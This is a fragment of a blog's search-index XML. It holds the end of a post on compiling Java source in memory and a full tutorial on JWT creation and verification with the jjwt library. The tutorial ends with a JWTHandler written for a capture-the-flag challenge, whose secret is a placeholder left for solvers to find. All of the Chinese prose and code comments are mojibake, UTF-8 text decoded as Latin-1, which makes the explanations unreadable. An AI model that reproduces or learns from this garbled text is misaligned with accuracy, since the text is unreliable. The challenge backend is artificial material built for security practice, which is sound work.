System.out.println(constantTransformer.transform(&quot;hello&quot;).toString());</span></span><br><span class="line"><span class="string">                          System.out.println(&quot;hello world&quot;);</span></span><br><span class="line"><span class="string">                      &#125;</span></span><br><span class="line"><span class="string">                  &#125;&quot;&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">SourceJavaFileObject</span> <span class="variable">sourceJavaFileObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SourceJavaFileObject</span>(<span class="string">&quot;TransformerTest&quot;</span>, sourceCode);</span><br><span class="line">        <span class="type">JavaCompiler</span> <span class="variable">compiler</span> <span class="operator">=</span> ToolProvider.getSystemJavaCompiler();</span><br><span class="line">        <span class="type">JavaFileManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaFileManager</span>(compiler.getStandardFileManager(<span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>));</span><br><span class="line"></span><br><span class="line">        JavaCompiler.<span class="type">CompilationTask</span> <span class="variable">task</span> <span class="operator">=</span> compiler.getTask(<span class="literal">null</span>, manager, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, List.of(sourceJavaFileObject));</span><br><span class="line">        task.call();</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> manager.getClassLoader(<span class="literal">null</span>);</span><br><span class="line">        Class&lt;?&gt; transformerTestClass = classLoader.loadClass(<span class="string">&quot;TransformerTest&quot;</span>);</span><br><span class="line">        <span class="type">CompileTest</span> <span class="variable">transformerTest</span> <span class="operator">=</span> (CompileTest) transformerTestClass.newInstance();</span><br><span class="line">        transformerTest.test();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ”¹äº†ä¸¤ä¸ªè½½ä½“ä¸€ä¸ªå¤„ç†é€»è¾‘ï¼Œ<code>SourceJavaFileObject</code>å’Œ<code>ClassJavaFileObject</code>ä¿è¯äº†å°†è¾“å…¥çš„æºä»£ç å’Œè¾“å‡ºçš„å­—èŠ‚ç éƒ½ä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œ<code>JavaFileManager</code>ä¿è¯ä»<code>ClassJavaFileObject</code>è·å–å­—èŠ‚ç æ•°æ®å¹¶ä¾æ­¤ç”Ÿæˆç±»åŠ è½½å™¨</p><br/>]]></content>
      
      
      <categories>
          
          <category> é›¶ç¢ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaåç«¯JWTéªŒè¯çš„å®ç°</title>
      <link href="/2026/01/10/Java%E5%90%8E%E7%AB%AFJWT%E9%AA%8C%E8%AF%81%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
      <url>/2026/01/10/Java%E5%90%8E%E7%AB%AFJWT%E9%AA%8C%E8%AF%81%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Javaåç«¯JWTéªŒè¯çš„å®ç°"><a href="#Javaåç«¯JWTéªŒè¯çš„å®ç°" class="headerlink" title="Javaåç«¯JWTéªŒè¯çš„å®ç°"></a>Javaåç«¯JWTéªŒè¯çš„å®ç°</h1><p>åœ¨Javaåç«¯ä¸­ä½¿ç”¨JWTä»¤ç‰ŒéªŒè¯éœ€è¦å¼•å…¥ä¸‰ä¸ªåŒ…</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>0.11.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>0.11.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-jackson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>0.11.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>jjwt-api</code>ç”¨äºåœ¨ç¼–è¯‘æ—¶æä¾›APIæ¥å£ï¼ŒåŒ…å«æ¥å£ã€æ–¹æ³•ç­‰ï¼Œ<code>jjwt-impl</code>åœ¨è¿è¡Œæ—¶æä¾›é»˜è®¤å®ç°ï¼Œé‡Œé¢çš„æ–¹æ³•å¯ä»¥è¢«é‡å†™ï¼Œ<code>jjwt-jackson</code>ç”¨äºæä¾›JSONå¤„ç†å™¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–JSONåº“</p><br/><h2 id="åŸºæœ¬API"><a href="#åŸºæœ¬API" class="headerlink" title="åŸºæœ¬API"></a>åŸºæœ¬API</h2><h3 id="Claimsæ¥å£"><a href="#Claimsæ¥å£" class="headerlink" title="Claimsæ¥å£"></a>Claimsæ¥å£</h3><p><code>Claims</code>æ˜¯JWTçš„æ ¸å¿ƒè½½è·ï¼Œç»§æ‰¿äº<code>Map&lt;String, Object&gt;</code>æ³›å‹é›†åˆï¼Œå…¶å†…éƒ¨æœ‰ä¸€äº›é»˜è®¤å­—æ®µ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">ISSUER</span> <span class="operator">=</span> <span class="string">&quot;iss&quot;</span>;  <span class="comment">//ç­¾å‘è€…ï¼Œä»£è¡¨ç­¾å‘ä»¤ç‰Œçš„æœºæ„</span></span><br><span class="line"><span class="type">String</span> <span class="variable">SUBJECT</span> <span class="operator">=</span> <span class="string">&quot;sub&quot;</span>;  <span class="comment">//ä¸»é¢˜ï¼Œç”¨äºæ ‡è¯†JWTçš„ç”¨æ³•ä»€ä¹ˆçš„</span></span><br><span class="line"><span class="type">String</span> <span class="variable">AUDIENCE</span> <span class="operator">=</span> <span class="string">&quot;aud&quot;</span>;  <span class="comment">//å—ä¼—ï¼Œæ ‡è¯†è¯¥JWTçš„é¢„æœŸæ¥æ”¶å¯¹è±¡</span></span><br><span class="line"><span class="type">String</span> <span class="variable">EXPIRATION</span> <span class="operator">=</span> <span class="string">&quot;exp&quot;</span>;  <span class="comment">//è¿‡æœŸæ—¶é—´ï¼Œè¡¨æ˜è¯¥JWTçš„æœ‰æ•ˆæˆªæ­¢æ—¶é—´</span></span><br><span class="line"><span class="type">String</span> <span class="variable">NOT_BEFORE</span> <span class="operator">=</span> <span class="string">&quot;nbf&quot;</span>;  <span class="comment">//ç”Ÿæ•ˆæ—¶é—´ï¼ŒJWTåœ¨è¯¥æ—¶é—´å‰æ— æ•ˆ</span></span><br><span class="line"><span class="type">String</span> <span class="variable">ISSUED_AT</span> <span class="operator">=</span> <span class="string">&quot;iat&quot;</span>;  <span class="comment">//ç­¾å‘æ—¶é—´ï¼Œè¡¨ç¤ºè¯¥JWTåˆ›å»ºçš„æ—¶é—´</span></span><br><span class="line"><span class="type">String</span> <span class="variable">ID</span> <span class="operator">=</span> <span class="string">&quot;jti&quot;</span>;  <span class="comment">//JWT IDï¼Œè¡¨ç¤ºä¸€ä¸ªJWTçš„å”¯ä¸€æ ‡è¯†</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå­—æ®µåœ¨æ¥å£å†…éƒ½è§„å®šäº†getterã€setteræ–¹æ³•</p><h3 id="CompressionCodecæ¥å£"><a href="#CompressionCodecæ¥å£" class="headerlink" title="CompressionCodecæ¥å£"></a>CompressionCodecæ¥å£</h3><p>è¯¥æ¥å£ç”¨äºè§„å®šJWTçš„å‹ç¼©ä¸è§£å‹æ–¹æ³•ï¼Œä»¥å‡å°‘ JWT çš„æ€»ä½“å¤§å°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] compress(<span class="type">byte</span>[] var1) <span class="keyword">throws</span> CompressionException;</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] decompress(<span class="type">byte</span>[] var1) <span class="keyword">throws</span> CompressionException;</span><br></pre></td></tr></table></figure><h3 id="Headeræ¥å£"><a href="#Headeræ¥å£" class="headerlink" title="Headeræ¥å£"></a>Headeræ¥å£</h3><p>headeræ˜¯JWTçš„å¤´éƒ¨éƒ¨åˆ†ï¼Œç»§æ‰¿äº<code>Map&lt;String, Object&gt;</code>æ³›å‹é›†åˆï¼Œå¯å£°æ˜JWTçš„ä¸€äº›å…ƒæ•°æ®ã€æè¿°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">JWT_TYPE</span> <span class="operator">=</span> <span class="string">&quot;JWT&quot;</span>;  <span class="comment">//å£°æ˜JWTç±»å‹</span></span><br><span class="line"><span class="type">String</span> <span class="variable">TYPE</span> <span class="operator">=</span> <span class="string">&quot;typ&quot;</span>;  <span class="comment">//ä»¤ç‰Œç±»å‹å­—æ®µå</span></span><br><span class="line"><span class="type">String</span> <span class="variable">CONTENT_TYPE</span> <span class="operator">=</span> <span class="string">&quot;cty&quot;</span>;  <span class="comment">//å†…å®¹ç±»å‹å­—æ®µå</span></span><br><span class="line"><span class="type">String</span> <span class="variable">COMPRESSION_ALGORITHM</span> <span class="operator">=</span> <span class="string">&quot;zip&quot;</span>;  <span class="comment">//å‹ç¼©ç®—æ³•å­—æ®µå</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå­—æ®µåœ¨æ¥å£å†…éƒ½è§„å®šäº†getterã€setteræ–¹æ³•</p><h3 id="JwtBuilderæ¥å£"><a href="#JwtBuilderæ¥å£" class="headerlink" title="JwtBuilderæ¥å£"></a>JwtBuilderæ¥å£</h3><p>è¯¥æ¥å£è§„å®šäº†æ„å»ºJWTä»¤ç‰Œçš„æ ¸å¿ƒæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">JwtBuilder</span> <span class="keyword">extends</span> <span class="title class_">ClaimsMutator</span>&lt;JwtBuilder&gt; &#123;</span><br><span class="line">    <span class="comment">//è®¾ç½®JWTå¤´</span></span><br><span class="line">    JwtBuilder <span class="title function_">setHeader</span><span class="params">(Header var1)</span>;</span><br><span class="line"><span class="comment">//ç”±äºJWTå¤´æœ¬è´¨æ˜¯ä¸€ä¸ªæ³›å‹Mapï¼Œä¹Ÿæ”¯æŒç›´æ¥ä¼ å…¥Mapå¯¹è±¡</span></span><br><span class="line">    JwtBuilder <span class="title function_">setHeader</span><span class="params">(Map&lt;String, Object&gt; var1)</span>;</span><br><span class="line"><span class="comment">//åƒHearderä¸­æ·»åŠ å•ä¸ªå‚æ•°</span></span><br><span class="line">    JwtBuilder <span class="title function_">setHeaderParams</span><span class="params">(Map&lt;String, Object&gt; var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtBuilder <span class="title function_">setHeaderParam</span><span class="params">(String var1, Object var2)</span>;</span><br><span class="line"><span class="comment">//ç›´æ¥ä¼ å…¥JSONæ•°æ®çš„æ–¹æ³•ï¼Œç°å·²å¾ˆå°‘ä½¿ç”¨</span></span><br><span class="line">    JwtBuilder <span class="title function_">setPayload</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//è®¾ç½®æ•´ä½“è½½è·</span></span><br><span class="line">    JwtBuilder <span class="title function_">setClaims</span><span class="params">(Claims var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtBuilder <span class="title function_">setClaims</span><span class="params">(Map&lt;String, ?&gt; var1)</span>;</span><br><span class="line"><span class="comment">//æ·»åŠ è‡ªå®šä¹‰è½½è·å­—æ®µå</span></span><br><span class="line">    JwtBuilder <span class="title function_">addClaims</span><span class="params">(Map&lt;String, Object&gt; var1)</span>;</span><br><span class="line"><span class="comment">//è®¾ç½®ç­¾å‘è€…</span></span><br><span class="line">    JwtBuilder <span class="title function_">setIssuer</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//è®¾ç½®ä¸»é¢˜</span></span><br><span class="line">    JwtBuilder <span class="title function_">setSubject</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//è®¾ç½®ç›®æ ‡å—ä¼—</span></span><br><span class="line">    JwtBuilder <span class="title function_">setAudience</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//è®¾ç½®è¿‡æœŸæ—¶é—´</span></span><br><span class="line">    JwtBuilder <span class="title function_">setExpiration</span><span class="params">(Date var1)</span>;</span><br><span class="line"><span class="comment">//è®¾ç½®ç”Ÿæ•ˆæ—¶é—´</span></span><br><span class="line">    JwtBuilder <span class="title function_">setNotBefore</span><span class="params">(Date var1)</span>;</span><br><span class="line"><span class="comment">//è®¾ç½®ç­¾å‘æ—¶é—´</span></span><br><span class="line">    JwtBuilder <span class="title function_">setIssuedAt</span><span class="params">(Date var1)</span>;</span><br><span class="line"><span class="comment">//è®¾ç½®JWT ID</span></span><br><span class="line">    JwtBuilder <span class="title function_">setId</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtBuilder <span class="title function_">claim</span><span class="params">(String var1, Object var2)</span>;</span><br><span class="line"><span class="comment">//ä½¿ç”¨ä¼ å…¥çš„keyä¸ºJWTä»¤ç‰Œç­¾å</span></span><br><span class="line">    JwtBuilder <span class="title function_">signWith</span><span class="params">(Key var1)</span> <span class="keyword">throws</span> InvalidKeyException;</span><br><span class="line"><span class="comment">//ä½¿ç”¨æŒ‡å®šçš„ç­¾åç®—æ³•å¯¹å¯†é’¥è¿›è¡Œç­¾å</span></span><br><span class="line">    JwtBuilder <span class="title function_">signWith</span><span class="params">(Key var1, SignatureAlgorithm var2)</span> <span class="keyword">throws</span> InvalidKeyException;</span><br><span class="line"><span class="comment">//ä½¿ç”¨å‹ç¼©</span></span><br><span class="line">    JwtBuilder <span class="title function_">compressWith</span><span class="params">(CompressionCodec var1)</span>;</span><br><span class="line"><span class="comment">//è‡ªå®šä¹‰Base64ç¼–ç é€»è¾‘</span></span><br><span class="line">    JwtBuilder <span class="title function_">base64UrlEncodeWith</span><span class="params">(Encoder&lt;<span class="type">byte</span>[], String&gt; var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtBuilder <span class="title function_">serializeToJsonWith</span><span class="params">(Serializer&lt;Map&lt;String, ?&gt;&gt; var1)</span>;</span><br><span class="line"><span class="comment">//æ‰§è¡ŒJWTæ„å»ºï¼Œè¾“å‡ºJWTå­—ç¬¦ä¸²</span></span><br><span class="line">    String <span class="title function_">compact</span><span class="params">()</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>claim()</code>æ–¹æ³•åœ¨é»˜è®¤å®ç°ç±»ä¸­çš„é€»è¾‘ã€‚è‹¥<code>claims</code>å­—æ®µä¸å­˜åœ¨åˆ™æ–°æ·»å­—æ®µï¼Œå¦åˆ™æ£€æµ‹<code>value</code>æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºåˆ™åˆ é™¤ä¼ å…¥çš„å­—æ®µï¼Œå¦åˆ™æ”¾å…¥å­—æ®µ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> JwtBuilder <span class="title function_">claim</span><span class="params">(String name, Object value)</span> &#123;</span><br><span class="line">        Assert.hasText(name, <span class="string">&quot;Claim property name cannot be null or empty.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.claims == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.ensureClaims().put(name, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.claims.remove(name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.claims.put(name, value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="JwtParserBuilderæ¥å£"><a href="#JwtParserBuilderæ¥å£" class="headerlink" title="JwtParserBuilderæ¥å£"></a>JwtParserBuilderæ¥å£</h3><p>è¯¥æ¥å£è§„å®šäº†è§£æJWTä»¤ç‰Œçš„æ ¸å¿ƒæ–¹æ³•ï¼Œå…ˆå‰çš„<code>JwtParser</code>ä¼—å¤šæ–¹æ³•å·²è¢«å¼ƒç”¨ï¼Œ<code>JwtParserBuilder</code>æ˜¯å…¶æ›¿ä»£æ–¹æ¡ˆï¼Œè¯¥æ–¹æ¡ˆå¼ºåˆ¶éªŒè¯ JWT Claims ä¸­çš„ç‰¹å®šå€¼ï¼Œä¸åŒ¹é…åˆ™è§£æå¤±è´¥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">JwtParserBuilder</span> &#123;</span><br><span class="line">    <span class="comment">//éªŒè¯JWT ID</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">requireId</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//éªŒè¯ä¸»é¢˜</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">requireSubject</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//éªŒè¯å—ä¼—</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">requireAudience</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//éªŒè¯ç­¾å‘è€…</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">requireIssuer</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">requireIssuedAt</span><span class="params">(Date var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">requireExpiration</span><span class="params">(Date var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">requireNotBefore</span><span class="params">(Date var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">require</span><span class="params">(String var1, Object var2)</span>;</span><br><span class="line"><span class="comment">//è®¾ç½®å‚è€ƒæ—¶é’Ÿ</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">setClock</span><span class="params">(Clock var1)</span>;</span><br><span class="line"><span class="comment">//è®¾ç½®å…è®¸çš„æ—¶é—´åå·®</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">setAllowedClockSkewSeconds</span><span class="params">(<span class="type">long</span> var1)</span> <span class="keyword">throws</span> IllegalArgumentException;</span><br><span class="line"><span class="comment">//è®¾ç½®å¯†é’¥</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">setSigningKey</span><span class="params">(<span class="type">byte</span>[] var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">setSigningKey</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">setSigningKey</span><span class="params">(Key var1)</span>;</span><br><span class="line"><span class="comment">//è®¾ç½®åŠ¨æ€å¯†é’¥è§£æå™¨</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">setSigningKeyResolver</span><span class="params">(SigningKeyResolver var1)</span>;</span><br><span class="line"><span class="comment">//å¤„ç†å‹ç¼©çš„JWTè½½è·</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">setCompressionCodecResolver</span><span class="params">(CompressionCodecResolver var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">base64UrlDecodeWith</span><span class="params">(Decoder&lt;String, <span class="type">byte</span>[]&gt; var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">deserializeJsonWith</span><span class="params">(Deserializer&lt;Map&lt;String, ?&gt;&gt; var1)</span>;</span><br><span class="line"><span class="comment">//æ„å»ºè§£æå™¨</span></span><br><span class="line">    JwtParser <span class="title function_">build</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JwtParseræ¥å£"><a href="#JwtParseræ¥å£" class="headerlink" title="JwtParseræ¥å£"></a>JwtParseræ¥å£</h3><p>ç°åœ¨<code>JwtParser</code>ä¸€èˆ¬åªç”¨äºæ¥æ”¶<code>JwtParserBuilder</code>è§„å®šçš„è§£æè§„åˆ™è¿›è¡Œè§£ææ“ä½œï¼Œä¸ç›´æ¥å‚ä¸éªŒè¯è¿‡ç¨‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">JwtParser</span> &#123;</span><br><span class="line">    <span class="type">char</span> <span class="variable">SEPARATOR_CHAR</span> <span class="operator">=</span> <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="comment">//æ£€æŸ¥æ˜¯å¦å…·æœ‰ç­¾å</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isSigned</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//ä¸éªŒè¯ç­¾åè¿”å›Jwtå¯¹è±¡</span></span><br><span class="line">    Jwt <span class="title function_">parse</span><span class="params">(String var1)</span> <span class="keyword">throws</span> ExpiredJwtException, MalformedJwtException, SignatureException, IllegalArgumentException;</span><br><span class="line"><span class="comment">//ä½¿ç”¨æŒ‡å®šå¤„ç†å™¨è§£æ</span></span><br><span class="line">    &lt;T&gt; T <span class="title function_">parse</span><span class="params">(String var1, JwtHandler&lt;T&gt; var2)</span> <span class="keyword">throws</span> ExpiredJwtException, UnsupportedJwtException, MalformedJwtException, SignatureException, IllegalArgumentException;</span><br><span class="line"><span class="comment">//è§£ææœªç­¾å/ä¸éªŒè¯ç­¾åçš„çº¯æ–‡æœ¬JWT</span></span><br><span class="line">    Jwt&lt;Header, String&gt; <span class="title function_">parsePlaintextJwt</span><span class="params">(String var1)</span> <span class="keyword">throws</span> UnsupportedJwtException, MalformedJwtException, SignatureException, IllegalArgumentException;</span><br><span class="line"><span class="comment">//è§£æä½†ä¸éªŒè¯ç­¾åçš„å£°æ˜JWT</span></span><br><span class="line">    Jwt&lt;Header, Claims&gt; <span class="title function_">parseClaimsJwt</span><span class="params">(String var1)</span> <span class="keyword">throws</span> ExpiredJwtException, UnsupportedJwtException, MalformedJwtException, SignatureException, IllegalArgumentException;</span><br><span class="line"><span class="comment">//éªŒè¯ç­¾åçš„çº¯æ–‡æœ¬JWS</span></span><br><span class="line">    Jws&lt;String&gt; <span class="title function_">parsePlaintextJws</span><span class="params">(String var1)</span> <span class="keyword">throws</span> UnsupportedJwtException, MalformedJwtException, SignatureException, IllegalArgumentException;</span><br><span class="line"><span class="comment">//éªŒè¯ç­¾åçš„å£°æ˜JWS</span></span><br><span class="line">    Jws&lt;Claims&gt; <span class="title function_">parseClaimsJws</span><span class="params">(String var1)</span> <span class="keyword">throws</span> ExpiredJwtException, UnsupportedJwtException, MalformedJwtException, SignatureException, IllegalArgumentException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="å…·ä½“å®ç°"><a href="#å…·ä½“å®ç°" class="headerlink" title="å…·ä½“å®ç°"></a>å…·ä½“å®ç°</h2><p>æ„é€ JWTï¼Œå…ˆä½¿ç”¨<code>jjwt-impl</code>è‡ªå¸¦çš„<code>Jwts</code>ç±»è·å–claims</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.claims();</span><br></pre></td></tr></table></figure><p>æ”¾å…¥å­—æ®µï¼Œä½¿ç”¨å¯†é’¥è¿›è¡Œç­¾å</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">makeUserToken</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.claims().setSubject(<span class="string">&quot;CommonUser&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;iat&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">        claims.put(<span class="string">&quot;exp&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis() + EXPIRATION_TIME));</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder().setClaims(claims).signWith(Keys.hmacShaKeyFor(SECRET.getBytes(StandardCharsets.UTF_8))).compact();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è§£æJWTï¼Œéœ€è¦å…ˆå®šä¹‰ä¸€ä¸ªè§£æå™¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Jws&lt;Claims&gt; claimsJws = Jwts.parserBuilder()</span><br><span class="line">.setSigningKey(SECRET.getBytes(StandardCharsets.UTF_8))</span><br><span class="line">.build()</span><br><span class="line">.parseClaimsJws(Token);</span><br></pre></td></tr></table></figure><p>è·å–å­—æ®µå</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">role</span> <span class="operator">=</span> claimsJws.getBody().getSubject();</span><br><span class="line"><span class="type">String</span> <span class="variable">other</span> <span class="operator">=</span> claimsJws.getBody().get(String claimName, Class&lt;T&gt; requiredType);</span><br></pre></td></tr></table></figure><p>æœ€åæ˜¯æˆ‘å†™çš„ä¸€ä¸ªJWTéªŒè¯åå°ï¼Œç”¨äºä¸€ä¸ªé¢˜ç›®çš„JWTéªŒè¯ï¼Œè™½ååˆ†ç®€é™‹ä½†ä¹Ÿå¤Ÿç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SECRET</span> <span class="operator">=</span> <span class="string">&quot;&#123;SECRET_KEY_WHICH_YOU_NEED_TO_FIND_IT_OUT&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">EXPIRATION_TIME</span> <span class="operator">=</span> <span class="number">86_400_000L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Boolean <span class="title function_">parseToken</span><span class="params">(String Token)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Jws&lt;Claims&gt; claimsJws = Jwts.parserBuilder()</span><br><span class="line">                    .setSigningKey(Keys.hmacShaKeyFor(SECRET.getBytes(StandardCharsets.UTF_8)))</span><br><span class="line">                    .build()</span><br><span class="line">                    .parseClaimsJws(Token);</span><br><span class="line">            <span class="type">String</span> <span class="variable">role</span> <span class="operator">=</span> claimsJws.getBody().getSubject();</span><br><span class="line">            <span class="keyword">return</span> role.equals(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">makeUserToken</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Date</span> <span class="variable">now</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="type">Date</span> <span class="variable">expiry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(now.getTime() + EXPIRATION_TIME);</span><br><span class="line">        <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.claims().setSubject(<span class="string">&quot;CommonUser&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;iat&quot;</span>, now);</span><br><span class="line">        claims.put(<span class="string">&quot;exp&quot;</span>, expiry);</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder().setClaims(claims).signWith(Keys.hmacShaKeyFor(SECRET.getBytes(StandardCharsets.UTF_8))).compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 